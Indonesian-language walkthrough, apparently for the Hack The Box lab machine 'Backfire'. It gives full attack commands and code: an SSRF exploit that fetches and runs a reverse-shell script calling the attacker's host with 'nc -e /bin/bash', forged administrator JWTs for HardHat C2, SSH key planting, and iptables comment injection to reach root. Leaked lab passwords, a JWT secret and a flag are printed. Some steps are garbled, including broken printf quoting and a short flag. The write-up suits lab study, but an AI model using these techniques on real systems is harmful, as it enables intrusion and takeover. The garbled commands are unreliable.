## **Informasi Mesin**
- **Nama**: Backfire
- **Sistem Operasi**: Linux
- **Tingkat Kesulitan**: Medium
- **Alamat IP**: 10.10.11.49
## **Tahap 1: Pemindaian Awal**

### **Rustscan Enumeration**
```bash
rustscan -a backfire.htb --ulimit 5000 -- -sC -sV
```

**Hasil Pemindaian:**

- **Port 22**: SSH
    
- **Port 443**: HTTPS (Havoc C2)
    
- **Port 8000**: HTTP (File Server)
    

## **Tahap 2: Enumerasi Service**

### **Analisis Port 443**
```bash
curl -k https://backfire.htb
```

Situs menggunakan HTTPS dengan jalur akses yang mencurigakan.

### **Enumerasi Port 8000**
```bash
curl http://backfire.htb:8000
```

**Temuan:**

- Direktori `/` dengan dua file penting:
    
    - `disable_tls.patch`
        
    - `havoc.yaotl`
        

### **Download dan Analisis File**
```bash
wget http://backfire.htb:8000/disable_tls.patch
wget http://backfire.htb:8000/havoc.yaotl
```

### **Ekstraksi Kredensial**

```bash
cat havoc.yaotl
```

**Kredensial yang Ditemukan:**

```yaml
Operators {
  user "ilya" {
    Password = "CobaltStr1keSuckz!"
  }
  user "sergej" {
    Password = "1w4nt2sw1tch2h4rdh4tc2"
  }
}
```

## **Tahap 3: Eksploitasi SSRF**

### **Deteksi Direktori /vulnerable**

Menggunakan script Python untuk SSRF:

```bash
python3 exploit.py -i 10.10.16.12 -p 80 -t "https://10.10.11.49:443" -ip 127.0.0.1
```

**Temuan:** Direktori `/vulnerable` ditemukan sebagai jalur akses tambahan.

### **Persiapan Reverse Shell**
```bash
cd /home/greed
echo -e "#!/bin/bash\nnc -e /bin/bash 10.10.16.12 4444" > rev.sh
chmod +x rev.sh
sudo python3 -m http.server 80
```

### **Eksekusi Payload via SSRF**

```bash
python3 gabungan.py -i 127.0.0.1 -p 40056 -t "https://backfire.htb" -ip 127.0.0.1 --cmd "curl http://10.10.16.12/rev.sh"
```

## **Tahap 4: Stabilisasi Akses**

### **Generate SSH Key**

```bash
ssh-keygen -t ed25519 -C "greed@loveyou" -f ~/.ssh/id_ed25519
cat ~/.ssh/id_ed25519.pub
```

### **Setup SSH Access di Target**

```bash
echo 'ssh-rsa AAAAB3...' > /home/ilya/.ssh/authorized_keys
chmod 600 /home/ilya/.ssh/authorized_keys
```
### **SSH Connection**

```bash
ssh -i ~/.ssh/id_ed25519 ilya@backfire.htb
```

## **Tahap 5: Eksploitasi Havoc C2**

### **SSRF untuk Akses Havoc**

```bash
python3 exploit.py -i 127.0.0.1 -p 40056 -t "https://backfire.htb:443" -ip 127.0.0.1
```

**Temuan:** Direktori `/havoc/` valid, layanan Havoc berjalan di localhost.

### **Autentikasi Havoc**

- **User**: ilya
    
- **Password**: CobaltStr1keSuckz!
### **Reverse Shell via Havoc**

```bash
nc -lvnp 4444
```

## **Tahap 6: User Flag**

```bash
cat /home/ilya/user.txt
```

**User Flag:** `0ef244ba71cf81fae8dec2cb0015b86`

## **Tahap 7: Port Forwarding dan HardHat C2**

### **SSH Port Forwarding**
```bash
ssh -L 5000:127.0.0.1:5000 -L 7096:127.0.0.1:7096 ilya@backfire.htb -i ~/.ssh/id_ed25519
```

### **Akses HardHat C2**

- Buka `https://127.0.0.1:5000`
    
- Buka `https://127.0.0.1:7096`
    

## **Tahap 8: Bypass Autentikasi JWT**

### **Generate JWT Token**

```python
import jwt
import datetime
import uuid

secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()
expiration = now + datetime.timedelta(days=28)

payload = {
    "sub": "HardHat_Admin",
    "jti": str(uuid.uuid4()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp())
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

### **Buat User Baru**

```python
import requests

headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
payload = {"username": "sth_pentest", "password": "sth_pentest", "role": "TeamLead"}
requests.post("https://127.0.0.1:7096/Login/Register", headers=headers, json=payload, verify=False)
```

## **Tahap 9: Eskalasi ke Sergej**

### **Akses Terminal C2**

```bash
whoami
```

### **SSH Key Injection via iptables**

```bash
ssh-keygen -t ed25519 -C "greed@loveyou"
sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment "$(printf '(cat /home/sergej/.ssh/id_ed25519.pub)"; echo '\n')"
```

### **Verifikasi dan Ekstraksi Key**

```bash
sudo /usr/sbin/iptables -S
sudo iptables-save -f /root/.ssh/authorized_keys
```

## **Tahap 10: Eskalasi ke Root**

### **SSH ke Localhost sebagai Root**

```bash
ssh -i ~/.ssh/id_ed25519 root@localhost
```

## **Tahap 11: Root Flag**

```bash
cat /root/root.txt
```